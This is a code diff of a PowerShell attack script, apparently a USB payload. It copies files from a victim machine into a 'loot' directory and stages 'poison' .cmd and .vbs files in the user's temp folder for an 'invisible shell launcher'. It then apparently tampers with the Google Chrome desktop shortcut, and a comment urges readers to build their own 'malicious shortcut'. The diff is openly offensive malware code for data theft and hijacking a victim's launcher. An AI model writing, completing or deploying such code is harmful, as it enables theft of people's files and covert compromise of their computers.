@@ -45,7 +45,7 @@ If ($steal_files_usb -eq 'yes') {
   robocopy $exfil_dir $loot_dir $exfil_ext /S /MT /Z
 }
 
-# Alright FTP time!
+# Alright FTP time! Ehh maybe we don't add this...
 
 # Real shortcut section
 # Note: if you want to add your own shortcuts, just build your own malicious shortcut as shown in the youtube video in the readme and another block of code like below but with your shortcut.
@@ -53,10 +53,14 @@ If ($steal_files_usb -eq 'yes') {
 If ($invisible_shell_launcher -eq 'yes') {
   $poison_file_a="$PSScriptRoot\f o.cmd"
   $poison_file_i="$PSScriptRoot\i.vbs"
-  $poison_file_c="$PSScriptRoot\z.cmd"
+  $poison_file_z="$PSScriptRoot\z.cmd"
   mkdir "$Env:UserProfile\temp\"
-
-  robocopy /S /MT /Z
+  $p_file_a_target="$Env:UserProfile\temp\f o.cmd"
+  $p_file_i_target="$Env:UserProfile\temp\i.vbs"
+  $p_file_z_target="$Env:UserProfile\temp\z.cmd"
+  robocopy $poison_file_a $p_file_a_target /S /MT /Z
+  robocopy $poison_file_i $p_file_i_target /S /MT /Z
+  robocopy $poison_file_z $p_file_z_target /S /MT /Z
 }
 
 If (Test-Path "$Env:UserProfile\Desktop\Google Chrome.lnk" -eq True  -AND $invisile_shell_launcher -eq 'yes') {
